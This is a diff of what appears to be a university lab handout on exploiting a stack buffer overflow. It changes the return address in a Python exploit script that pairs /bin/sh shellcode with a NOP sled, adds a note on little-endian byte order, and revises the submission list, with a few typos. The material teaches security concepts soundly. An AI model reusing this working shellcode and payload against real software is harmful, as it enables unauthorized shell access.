@@ -615,11 +615,14 @@ $1 = (char (*)[500]) 0xffffce80
 
 Let's now pick any memory address within the `x90` NOP sled area before
 the shellcode to be our return address. From the screenshot above we can
-pick `0xffffcfee` for example.
+pick `0xffffce90` for example.
 
 
 Since Intel CPUs are [little
 endian](https://en.wikipedia.org/wiki/Endianness), we need to reverse the address for our payload.
+
+Note on Little-Endian: Intel CPUs store multi-byte values with the least-significant byte first. This means you must write your address backward in the exploit.
+If GDB shows the address is 0xffffce90, you must write it as b"\x90\xce\xff\xff".
 
 Our script becomes:
 
@@ -627,7 +630,7 @@ Our script becomes:
 import sys
 
 shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-eip = b"\xee\xcf\xff\xff" * 10
+eip = b"\x90\xce\xff\xff" * 10
 nop = b"\x90" * 447
 buff = nop + shellcode + eip
 
@@ -666,7 +669,7 @@ resulting in obtaining access to a command shell.
 
 # What to hand in
 
-Submission Instructions
+## Submission Instructions
 
 Please submit a single PDF document containing the following items in order. For each screenshot, please include a brief caption explaining what the image shows and why it is significant to the lab.
 
@@ -674,11 +677,13 @@ Please submit a single PDF document containing the following items in order. For
 
    - Initial EIP Overwrite:
 
-      -  The number of 'A' characters required to overwrite EIP and cause a segmentation fault.
+      --  The number of 'A' characters required to overwrite EIP and cause a segmentation fault.
 
-      -  A screenshot of the info registers command in GDB showing EIP overwritten with 0x41414141.
+      --  A screenshot of the info registers command in GDB showing EIP overwritten with 0x41414141.
 
    - Full Register Overwrite: A screenshot showing the output of info registers and x/14x $sp+460 after running the payload with 'B's, 'C's, and 'D's. The EIP, EBP, and EBX registers should be clearly overwritten.
+
+   - Test exploit code: A scren shot of the terminal shoing the eploit-test.py being run with the print of the memory running in the buffer
 
    - Final Exploit Code: The complete, final source code for your exploit.py script.
 
